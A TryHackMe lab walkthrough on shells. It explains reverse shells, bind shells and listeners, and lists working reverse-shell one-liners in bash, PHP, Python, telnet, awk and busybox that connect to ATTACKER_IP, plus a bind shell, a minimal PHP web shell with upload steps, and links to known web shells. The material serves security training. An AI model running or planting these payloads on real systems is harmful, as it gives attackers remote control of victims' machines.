# TryHackMe — Shells Overview walkthrough

Room URL: 

---
#  Shell Overview

## What is a Shell?

A **shell** is software that allows a user to interact with an operating system. It can be a **graphical interface**, but is most commonly a **command-line interface (CLI)** — depending on the OS running on the target system.


## Shell in Cybersecurity

In cybersecurity, a shell often refers to a **remote command-line session** that an **attacker uses** after gaining access to a compromised system. This shell allows attackers to **execute commands and run software remotely**.


##  Common Attacker Activities with a Shell

### 1. Remote System Control
- Enables the attacker to execute commands or software **remotely** on the target system.

### 2. Privilege Escalation
- If the attacker gains **limited access**, they can attempt to **escalate privileges** to gain administrative or root access.

### 3. Data Exfiltration
- Attackers can **read and extract sensitive data** from the target system using shell commands.

### 4. Persistence & Maintaining Access
- Attackers can create **backdoors**, add new users or credentials, or install tools to **keep access** for later.

### 5. Post-Exploitation Activities
- Once a shell is established, attackers can:
  - Deploy malware
  - Create hidden users
  - Delete or manipulate files

### 6. Pivoting (Accessing Other Systems)
- Shell access can serve as a **pivot point** to move through the network and target other systems. This process is known as **pivoting**.

Understanding how attackers use shells helps defenders **detect**, **analyze**, and **prevent** further exploitation.



---
# Reverse Shell Notes

A **Reverse Shell**, also called a "connect-back shell," is a commonly used technique in cyberattacks to gain access to a victim machine.


## What Is a Reverse Shell?

A reverse shell causes the **target machine to initiate a connection** back to the attacker's machine. This technique:
- **Bypasses firewalls**, as many allow outbound connections but block incoming ones.
- Enables the attacker to execute commands remotely.


## How Reverse Shells Work

The attacker uses a tool (like **Netcat**) to listen on a port, waiting for the target to connect back.

### Set up a Netcat Listener
```bash
nc -lvnp 443
```

### Explanation of Netcat Command
- `-l`: Listen for incoming connections
- `-v`: Verbose mode (gives feedback)
- `-n`: Avoid DNS lookup
- `-p 443`: Use port 443 to listen (can be any port)

**Commonly used ports for reverse shells**: 53, 80, 443, 139, 445 — to blend in with normal traffic.


## Gaining Reverse Shell Access

Once the listener is ready, the attacker needs to **execute a reverse shell payload** on the victim machine.

### Example Payload: Pipe Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
###  What Is a Pipe Reverse Shell?
A pipe reverse shell is a type of shell that uses named pipes (FIFOs) to communicate between the attacker's machine and the target system, typically over an existing connection (like TCP). It's one of the stealthier ways to gain remote access to a target because it can avoid using full-blown shell binaries or obvious command-line interaction.

### How It Works (Conceptual Flow)
1. On the target system:
  - Create two named pipes (e.g., `/tmp/in` and `/tmp/out`).
  - Redirect shell input from `/tmp/in`.
  - Redirect shell output to `/tmp/out`.
2. On the attacker’s side:
  - Maintain a connection that sends commands into /tmp/in.
  - Reads output from `/tmp/out`.

#### Payload Breakdown
- `rm -f /tmp/f` – Remove existing named pipe at `/tmp/f`
- `mkfifo /tmp/f` – Create a **named pipe** at `/tmp/f`
- `cat /tmp/f` – Read input from the pipe
- `| sh -i 2>&1` – Pipe input into an interactive shell; redirect error to output
- `| nc ATTACKER_IP ATTACKER_PORT` – Send shell I/O to attacker
- `>/tmp/f` – Write shell output back into pipe to maintain 2-way communication


## Attacker Receives the Shell

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The attacker now has full shell access to the compromised machine.

---
# Bind Shell 

## Bind Shell

A **bind shell** opens a listening port on the target machine. The attacker connects to this port to get a shell, allowing remote command execution. This approach is used when the target cannot initiate outbound connections.

### How Bind Shell Works

The following payload sets up a bind shell on the target:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Breakdown of the Payload

- `rm -f /tmp/f`  
  Removes any existing named pipe (`/tmp/f`) to avoid conflicts.

- `mkfifo /tmp/f`  
  Creates a named pipe (FIFO) at `/tmp/f`. This pipe will be used for bidirectional data flow.

- `cat /tmp/f`  
  Reads input from the named pipe.

- `| bash -i 2>&1`  
  Sends the input to an interactive bash shell. The `2>&1` redirects standard error to standard output, so all output (stdout + stderr) is captured.

- `| nc -l 0.0.0.0 8080`  
  Starts a Netcat listener on all interfaces (`0.0.0.0`) at port `8080`. When an attacker connects to this port, the shell session is exposed.

- `> /tmp/f`  
  Writes the shell output back to the named pipe for sending to the attacker.

### Use on Target Machine

```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Use on Attacker Machine

To connect to the bind shell:

```bash
nc -nv TARGET_IP 8080
```

**Explanation:**
- `nc` starts Netcat.
- `-n` disables DNS resolution.
- `-v` enables verbose mode.
- `TARGET_IP` is the IP of the target machine.
- `8080` is the listening port.


## Pipe Reverse Shell

In contrast to the bind shell, a **reverse shell** initiates a connection from the target to the attacker's system. The attacker sets up a listener, and the target machine connects back to it.

The pipe technique is used to emulate bidirectional communication using named pipes (FIFOs). This can be used in either bind or reverse shells. In the bind shell example above, we used the named pipe `/tmp/f` to handle both input and output.

This method is popular in restricted environments because it avoids complex tools and uses only bash and Netcat, which are often pre-installed.

---

# Shell Listeners

As we learned in previous tasks, a reverse shell will connect from the compromised target to the attacker’s machine. A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.

Let’s explore some tools that can be used as listeners to interact with an incoming shell.


## Rlwrap

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

**Usage Example (Enhancing a Netcat Shell With Rlwrap):**
```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

This wraps `nc` with `rlwrap`, allowing the use of features like arrow keys and history for better interaction.


## Ncat

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).

**Usage Example (Listening for Reverse Shells):**
```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

**Usage Example (Listening for Reverse Shells with SSL):**
```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

The `--ssl` option enables SSL encryption for the listener.


## Socat

It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

**Default Usage Example (Listening for Reverse Shell):**
```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

The command above used the `-d` option to enable verbose output; using it again (`-d -d`) will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the `STDOUT` option directs any incoming data to the terminal.


---

# Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or sends a connection in the case of a reverse shell.

Let’s explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell techniques.

---

## Bash

### Normal Bash Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
This command launches an interactive Bash shell (`-i`), then uses redirection to send both standard output and standard error to a TCP socket connected to `ATTACKER_IP` on port `443`. `>&` is used to redirect both stdout and stderr, and `0>&1` connects standard input from the same source.

---

### Bash Read Line Reverse Shell
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
Creates a bidirectional connection on file descriptor 5 to the attacker's IP. It reads lines from the socket and executes each as a command, sending both stdout and stderr back to the attacker via the same connection.

---

### Bash With File Descriptor 196 Reverse Shell
```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
Uses file descriptor `196` to establish a socket connection. Then redirects stdin, stdout, and stderr through this descriptor to create a bidirectional communication channel.

---

### Bash With File Descriptor 5 Reverse Shell
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
Creates an interactive Bash shell that connects via file descriptor 5. Redirects all I/O (input, output, error) to communicate over a TCP connection with the attacker.

---

## PHP

### PHP Reverse Shell Using the `exec` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
Creates a TCP connection to the attacker’s IP on port 443 using `fsockopen`, then executes a shell with input/output redirected to the socket using `exec()`.

---

### PHP Reverse Shell Using the `shell_exec` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
Similar to `exec`, but `shell_exec()` returns the command output as a string. Used for command execution and result collection.

---

### PHP Reverse Shell Using the `system` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
`system()` executes the command and immediately displays output. Useful for real-time interaction through the browser or terminal.

---

### PHP Reverse Shell Using the `passthru` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
`passthru()` executes commands and directly outputs raw data. Effective when working with binary data over the connection.

---

### PHP Reverse Shell Using the `popen` Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
Opens a process pointer using `popen()` for command execution. Enables read access from the executed process, allowing shell interaction.

---

## Python

### Python Reverse Shell with Environment Variables
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;
s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
Sets environment variables for the attacker's host and port. Python creates a socket, connects, duplicates I/O file descriptors to use the socket, and spawns a pseudo-terminal for interactive access.

---

### Python Reverse Shell with `subprocess` Module
```bash
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("bash")'
```
Same core idea: connects to an IP, redirects I/O via `dup2`, and spawns an interactive bash shell using `pty`.

---

### Short Python Reverse Shell
```bash
python -c 'import os,pty,socket;
s=socket.socket();s.connect(("ATTACKER_IP",443));
[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
A shorter version of the reverse shell script. Still creates a TCP connection and redirects input/output/error via `dup2()`.

---

## Others

### Telnet Reverse Shell
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
Creates a named FIFO pipe (`mkfifo`). Telnet connects to the attacker, sending input to `sh`, and output is piped back through the FIFO.

---

### AWK Reverse Shell
```bash
awk 'BEGIN {
s = "/inet/tcp/0/ATTACKER_IP/443";
while(42) {
  do {
    printf "shell>" |& s;
    s |& getline c;
    if(c) {
      while ((c |& getline) > 0) print $0 |& s;
      close(c);
    }
  } while(c != "exit")
  close(s);
}}' /dev/null
```
Leverages AWK’s internal TCP support to create an infinite loop connection to the attacker. Executes any command sent and returns results over the same socket.

---

### BusyBox Reverse Shell
```bash
busybox nc ATTACKER_IP 443 -e sh
```
Uses BusyBox’s implementation of Netcat (`nc`) to connect to the attacker's IP and execute a shell (`sh`) upon successful connection.

---
# Web Shells

A **web shell** is a script written in a language supported by a compromised web server that executes commands through the web server itself. It allows attackers to interact with the server’s OS, often with the same privileges as the web server process.

Web shells are typically uploaded using vulnerabilities like:
- Unrestricted File Upload  
- File Inclusion (LFI/RFI)  
- Command Injection  
- Unauthorized Access  

They can be hidden in various places and evade detection while allowing full control over the compromised server.

---

## Example PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

## Explanation:
1. This is a minimal PHP web shell.
2. It checks if the cmd parameter exists in the GET request.
3. If it does, it uses the system() function to execute the command on the server.

## Deployment
1. Save it as shell.php
2. Upload it to the target server (e.g., via a file upload vulnerability)
3. Access it through the browser:

## Example URL to execute whoami:

```bash
http://victim.com/uploads/shell.php?cmd=whoami
```

This executes whoami on the server and displays the result in the browser.

## Popular Web Shells Available Online
Here are some widely used web shells written in PHP, often used by attackers for their extended functionality:

1. [p0wny-shell](https://github.com/flozz/p0wny-shell)
   - Minimalistic single-file shell
   - Lightweight
   - Remote command execution via a small web interface
![image](https://github.com/user-attachments/assets/fa3adcb8-316b-4629-a86c-02dc89334ae5)

2. [b374k shell](https://github.com/b374k/b374k)
   - Feature-rich web shell
   - File manager, command execution, and more
   - User-friendly interface
![image](https://github.com/user-attachments/assets/abce5415-3f89-4d8f-8a8c-694672307b84)

3. [c99 shell](https://www.r57shell.net/single.php?id=13)
   - Robust and full-featured
   - Often heavily obfuscated
   - Includes network tools, file handling, and SQL integration
![image](https://github.com/user-attachments/assets/8efa6775-2374-4ecd-a201-ae1566ac6b80)

You can find more web shells at: https://www.r57shell.net/index.php. 

